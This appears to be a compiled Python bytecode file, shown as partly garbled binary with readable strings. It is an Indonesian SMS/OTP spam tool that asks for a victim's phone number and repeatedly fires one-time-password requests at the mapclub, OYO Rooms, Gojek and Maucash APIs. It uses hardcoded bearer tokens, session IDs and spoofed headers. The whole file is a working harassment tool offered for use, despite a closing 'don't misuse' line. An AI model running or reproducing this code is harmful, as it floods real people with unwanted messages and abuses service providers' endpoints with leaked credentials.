�
    1�ci  �                   �  � d � Z  e �   �         rd�Z ddlZ	 ddlZn# e$ r  ej        d�  �         Y nw xY wddlZddlZddlZddlZddlZddlm	Z	mZ  ej
        �   �         Z ej        d�  �         dZdZd	ZdZdZd
� Zd� Zd� Zd� Zd� Z G d� d�  �        Ze� d�Zd� Zd� Zd� Zd� Zedk    r e�   �           e�   �          dS dS )c                  �   � d S )N� r   �    �<Mr-XsZ>�<lambda>r      r   r   �OOOOOOOOOOOOOOO�    N�pip3 install requests��	timedelta�datetime�clear�[37;1m�[32;1m�[31;1mc                 ��   � d� } |�   �         rd�}ddddddd	d
dddddddd�}d| i}t          j        d||��  �        �                    �   �         }|d         }d|k    rt          d�  �         d S t          d�  �         d S )Nc                  �   � d S )Nr   r   r   r   r   �on1.<locals>.<lambda>   r   r   r   �beryllium.mapclub.com�Google�WEB�1669440670973�en-US�?1�/  Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiIyYjFmMWJlNS0zNDc0LTRiOWUtOTgxZS1jZjI1OTVjMjg0N2YiLCJleHBpcmVkIjoxNjY5NDQ0MjA3ODMyLCJleHBpcmUiOjM2MDAsImV4cCI6MTY2OTQ0NDIwNywiaWF0IjoxNjY5NDQwNjA3LCJwbGF0Zm9ybSI6IldFQiJ9.Qn4g63IWVCk85hp4EUpRI8qvrFTnDgfqVE0CvwvESyrhnOIIV98caEDGvuXfKy3IR6VKMT6lHoUboUQnlUtHGw��Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36�!application/json, text/plain, */*�Android�https://www.mapclub.com�	same-site�cors�empty�https://www.mapclub.com/��Hostz	sec-ch-uazclient-platformzclient-timestamp�accept-languagezsec-ch-ua-mobile�authorization�
user-agent�acceptzsec-ch-ua-platform�originzsec-fetch-sitezsec-fetch-modezsec-fetch-dest�referer�account�=https://beryllium.mapclub.com/api/member/registration/sms/otp��headers�json�successF�[!] Limit 1�[+] Sukses 1)�requests�postr/   �print)�_8�
OOOOOOOOOO�hd�dt�res�re1s         r   �on1r<      r   r   c                 �  � d� } |�   �         rd�}t          j        dt          j        | dddddd	��  �        d
dddddddddd�
��  �        �                    �   �         }|d         }d|k    rt	          d�  �         d S t	          d�  �         d S )Nc                  �   � d S )Nr   r   r   r   r   �on2.<locals>.<lambda>&   r   r   r   �Uhttps://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id�+62�ID�4�true�Consumer_Guest��phone�country_code�country_iso_code�nod�send_otp�devise_role�identity-gateway.oyorooms.com�https://www.oyorooms.com�id�8SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=�yMozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36�application/json�*/*�https://www.oyorooms.com/login�gzip,deflate,br�
r$   �consumer_hostr%   �access_token�
User-AgentzContent-Typer(   r)   r*   �Accept-Encoding��datar.   �otp_sentT�[+] Sukses 2�[!] Limit 2)r3   r4   r/   �dumpsr5   )r6   r7   �sendr;   s       r   �on2rb   %   r   r   c                 ��   � d� } |�   �         rd�}t          j        ddd| dd�dd	d
dddddddddddd���  �        �                    �   �         }|d         }d|k    rt          d�  �         d S t          d�  �         d S )Nc                  �   � d S )Nr   r   r   r   r   �on3.<locals>.<lambda>1   r   r   r   �%https://api.gojekapi.com/v5/customers�nsjwwiwiwnsnn12@gmail.com�ariftusrB   ��email�namerG   �signed_up_country�$f8b67b26-c6a4-44d2-9d86-8d93a80901c9r   �8606f4e3b85968fd�3.52.2�com.gojek.apprR   �Bearer�customer�id-ID�id_ID�api.gojekapi.com�
Keep-Alive�gzip�okhttp/3.12.1�zX-Session-IDz
X-Platformz
X-UniqueIdzX-AppVersionzX-AppId�Accept�AuthorizationzX-User-TypezAccept-LanguagezX-User-Localer$   �
ConnectionrZ   rY   r[   r0   T�[+] Sukses 3�[!] Limit 3)r3   r4   r/   r5   )�_62r7   �h1�h2s       r   �on3r�   0   r   r   c                 �,  � d� } |�   �         rd�}t          j        d| � d�ddddd	d
dddd�	��  �        �                    �   �         }|d         }d|k    rt          d�  �         nt          d|� d��  �         t	          d�  �         t          �   �          d S )Nc                  �   � d S )Nr   r   r   r   r   �on4.<locals>.<lambda>;   r   r   r   �?https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile=�&channelType=0�japi.maucash.idr   �google play�1�
YN-MAUCASH�2.4.23�androidrw   rx   �	r$   r(   zx-originzx-org-idzx-product-codezx-app-versionzx-source-idzaccept-encodingr'   �r.   �message�Permintaan berhasil�[+] Sukses 4�[+] � 4�   )r3   �getr/   r5   �waku)r6   r7   r�   r�   s       r   �on4r�   :   r   r   c                 �   � d� } |�   �         rd�}| dk    r6t          d| � d�d��  �         | dz  } t          j        d�  �         | dk    �4d S d S )	Nc                  �   � d S )Nr   r   r   r   r   �waku.<locals>.<lambda>H   r   r   r   r   �[!] Tunggu � � ��end�   )r5   �time�sleep)�nr7   s     r   r�   r�   G   r   r   c                   �8   � e Zd Zd� Z e�   �         rd�Zd� Zd� ZdS )�nyepamc                  �   � d S )Nr   r   r   r   r   �nyepam.<lambda>R   r   r   r   c                 �P   � d� } |�   �         rd�}|||c| _         | _        | _        d S )Nc                  �   � d S )Nr   r   r   r   r   �!nyepam.__init__.<locals>.<lambda>U   r   r   r   )r6   �_08r   )�selfr6   r�   r   r7   s        r   �__init__�nyepam.__init__T   r   r   c                 ��  � d� } |�   �         rd�}	 t          |�  �        D ]R}t          | j        �  �         t          | j        �  �         t	          | j        �  �         t          | j        �  �         �Sd S # t          j        j	        $ r t          t          � d��  �         Y d S t          j        j        $ r t          t          � d��  �         Y d S t          t          f$ r t          d�  �         Y d S w xY w)Nc                  �   � d S )Nr   r   r   r   r   �nyepam.mulai.<locals>.<lambda>Y   r   r   r   �[!] Kesalahan Pada Koneksi�[!] Exit)�ranger<   r6   rb   r�   r   r�   �reek�
exceptions�ReadTimeout�exit�m�ConnectionError�KeyboardInterrupt�EOFError)r�   �asur7   �xs       r   �mulai�nyepam.mulaiX   r   �   �A"A5 �5+C3�#*C3�C3�2C3N)�__name__�
__module__�__qualname__r7   r�   r�   r   r   r   r�   r�   Q   r   r   r�   ��

   _____                     
  / ___/____  ____ _____ ___ 
  \__ \/ __ \/ __ `/ __ `__ \ 
 ___/ / /_/ / /_/ / / / / / /
/____/ .___/\__,_/_/ /_/ /_/ 
    /_/                      
c                  �L   � d� }  | �   �         rd�} t          t          �  �         d S )Nc                  �   � d S )Nr   r   r   r   r   �baner.<locals>.<lambda>r   r   r   r   )r5   �tam)r7   s    r   �banerr�   q   r   r   c                  �2  � d� }  | �   �         rd�} t          t          � dt          � d��  �         t          d�  �         t          d�  �        }|dk    rt	          �   �          d S |dk    rt          d	�  �         d S t          d
�  �         t          �   �          d S )Nc                  �   � d S )Nr   r   r   r   r   �bingung.<locals>.<lambda>x   r   r   r   �#   
[√] Semua Spam Terkirim Berhasil�
�6Ingin Spam Lagi?
Ketik y untuk ya ketik t untuk tidak
�y/t : �y�t�Terima Kasih!�Masukan Yang Benar!)r5   �h�p�input�cokr�   �bingung)r7   �pilihs     r   r�   r�   w   r   r   c                  �N  � d� }  | �   �         rd�} 	 	 t          d�  �        }|dd�         }|dv rt          d�  �         �nd	|vrt          d
�  �         n�t          |�  �        dk    rt          d�  �         n�|dk    rt          d�  �         n�	 t          t          d�  �        �  �        }n$#  t          d�  �         t	          �   �          Y nxY w|dk     s|dk    rt          d�  �         t	          �   �          t          j        d�  �         t          d�  �         |dd�         }d|z   }t          |||�  �        �                    |�  �         d S nT# t          $ r&}t          t          |�  �        �  �         Y d }~n)d }~wt          t          f$ r t          d�  �         Y nw xY w���)Nc                  �   � d S )Nr   r   r   r   r   �cok.<locals>.<lambda>�   r   r   r   T�   [+] Nomer Korban 08×××	: r   �   �r�   r�   �[!] Jangan Kosong no nya�08�[!] Gunakan Nomer 08xxx
�
   �#[!] Nomer Harus Lebih Dari 10 Angka�082211661007�3[!] Anda Tidak Bisa Spam Yang Punya Script Goblok!
�[+] Masukan Jumlah Spam	: �"Masukan Format Angka Jangan Huruf!r�   �   �	[!] Max 5�
[+] Sedang Menyepam...�   �62r�   )r�   r5   �len�intr�   r�   r�   r�   r�   �	Exceptionr�   �strr�   r�   )r7   �ar�   �suu�b�c�exs          r   r�   r�   �   r   �7   �A;E �B+ �*E �+C�
BE �
F"�E<�<#F"�!F"c                  ��   � d� }  | �   �         rd�} t          �   �          t          j        �   �         }t          |�  �        �                    d�  �        d         }t          t          � d|� t          � d��  �         d S )Nc                  �   � d S )Nr   r   r   r   r   �memek.<locals>.<lambda>�   r   r   r   �.r   �%
TELEGRAM : https://t.me/Termuxzts | �/

Jangan Disalah Gunakan 
Subcribe YT : Mr XsZ
)r�   r   �todayr�   �splitr5   r�   r�   )r7   r�   �tus      r   �memekr  �   r   r   �__main__)r7   �osr3   �ImportError�systemr�   r/   r�   r   r   �Session�reqr�   r�   r�   �ber�gagr<   rb   r�   r�   r�   r�   r�   r�   r�   r�   r  r�   r   r   r   �<module>r     r   �   � �2�2